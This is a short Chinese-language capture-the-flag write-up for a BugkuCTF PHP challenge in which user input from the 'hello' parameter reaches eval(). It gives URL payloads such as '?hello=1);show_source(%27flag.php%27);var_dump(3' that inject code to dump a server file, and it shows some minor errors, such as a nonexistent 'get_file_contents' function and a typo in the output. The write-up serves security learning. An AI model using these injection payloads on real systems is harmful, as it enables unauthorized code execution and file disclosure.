BugkuCTF 本地包含

题目链接
怎么说呢，虽说不算难，但是考的基础知识还是值得探讨分析一下的

代码解释

a. include"flag.php"; 把我们想要的弗拉格藏了起来，哼
b. $_request这个变量对 GET 、POST 都能接受，但这个全局变量在运行时修改后者不会影响前者（反之亦然）
c. 以get / post / cookies 等方式把以hello为名的东西提交过来
d. eval函数把字符串当作命令直接执行

首先选择 get 传值
根据最基本注入 '' 引号闭合的思路，很容易就想到了利用括号，毕竟，eval 中是执行的代码段。

测试一下：

Code

代码结合起来就是：

eval( "var_dump(1);print_r(2);");


发现还行，既然执行没问题，就可以构造名字为hello的攻击命令，把flag.php里面的代码以数组形式输出出来。

最后在url里如此构造攻击命令：

?hello=file("flag.php")

?hello=get_file_contents('flag.php') // 或者这种

?hello=1);print_r(file("./flag.php")

除了直接将 flag.php 文件读入变量 hello 中；还可利用 eval() 的命令执行漏洞，使用hello构造payload：

?hello=1);show_source(%27flag.php%27);var_dump(3

注入理解

file()函数的作用是读取文件，然后以数组的形式返回
eval函数中， " " 内部为代码， // 只在代码中起作用，相当于只注释了)；
然后我们来分析一下 file_get_contents 与 file 及 var_dump，print_r 和 echo

返回值如下

Array ( [0] => icnlude "flag.php"; [2] => $a = @$_Request['hello']; [3] => eval("var_dump($a);"); [4] => show_source(__file__); [5] => ?> )
